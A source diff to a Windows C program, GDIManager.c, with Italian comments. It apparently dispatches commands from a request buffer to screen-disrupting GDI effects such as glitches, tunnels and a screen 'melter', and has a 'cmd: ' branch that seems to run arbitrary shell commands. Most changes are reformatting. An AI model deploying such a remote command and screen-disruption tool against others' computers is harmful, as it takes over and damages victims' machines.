@@ -1,4 +1,5 @@
 // compile 4 windows: cl C:\Users\user\Desktop\GDIManager.c /O2 /link gdi32.lib user32.lib
+// devi compilare dalla shell di sviluppo x64 di vscommunity
 #ifdef _WIN32
     #define popen _popen // MSVC non riconosce popen, ma _popen, quindi definisce popen as _popen, idem con pclose
     #define pclose _pclose
@@ -319,59 +320,47 @@ int main() {
 
         if (strstr(reqtextbuffer, "1")) {
             int i;
-            for (i=0;i<100;i++) {
-                startfx();
-            }
+            for (i=0;i<100;i++) {startfx();}
         }
 
         else if (strstr(reqtextbuffer, "2")) {
             int i;
-            for(i=0;i<100;i++) {
-                heightglitch_run();
-            }
-            
+            for(i=0;i<100;i++) {heightglitch_run();}
         }
 
         else if (strstr(reqtextbuffer, "3")) {
             int i;
-            for(i=0;i<100;i++) {
-                widthglitch_run();
-            }
+            for(i=0;i<100;i++) {widthglitch_run();}
         }
 
         else if (strstr(reqtextbuffer, "4")) {
             int i;
-            for(i=0;i<100;i++) {
-                tunnel_run();
-            }
+            for(i=0;i<100;i++) {tunnel_run();}
         }
 
         else if (strstr(reqtextbuffer, "5")) {
             int i;
-            for (i=0;i<100;i++) {
-                circleshake_run();
-            }
+            for (i=0;i<100;i++) {circleshake_run();}
         }
 
         else if (strstr(reqtextbuffer, "6")) {
             int i;
-            for (i=0;i<100;i++) {
-                ltunnel_run();
-            }
+            for (i=0;i<100;i++) {ltunnel_run();}
         }
 
         else if (strstr(reqtextbuffer, "7")) {
             int i;
-            for (i=0;i<500;i++) {
-                squarefx_run();
-            }
+            for (i=0;i<500;i++) {squarefx_run();}
         }
 
         else if (strstr(reqtextbuffer, "8")) {
             int i;
-            for (i=0;i<1000;i++) {
-                fkngmelter();
-            }
+            for (i=0;i<1000;i++) {fkngmelter();}
+        }
+
+        else if (strstr(reqtextbuffer, "Lulu")) {
+            int i;
+            for (i=0;i<500;i++) {lulu();}
         }
 
         else if (strstr(reqtextbuffer, "cmd: ")) { // if contiene "cmd: "
@@ -385,13 +374,6 @@ int main() {
 
         else if (strstr(reqtextbuffer, "CleanDWM")) {
             cleandwm();
-        }
-
-        else if (strstr(reqtextbuffer, "Lulu")) {
-            int i;
-            for (i=0;i<500;i++) {
-                lulu();
-            }
         }
 
         else if (strstr(reqtextbuffer, "RandomMSGs")) {
@@ -410,5 +392,3 @@ int main() {
     }
     return 0;
 }
-
-
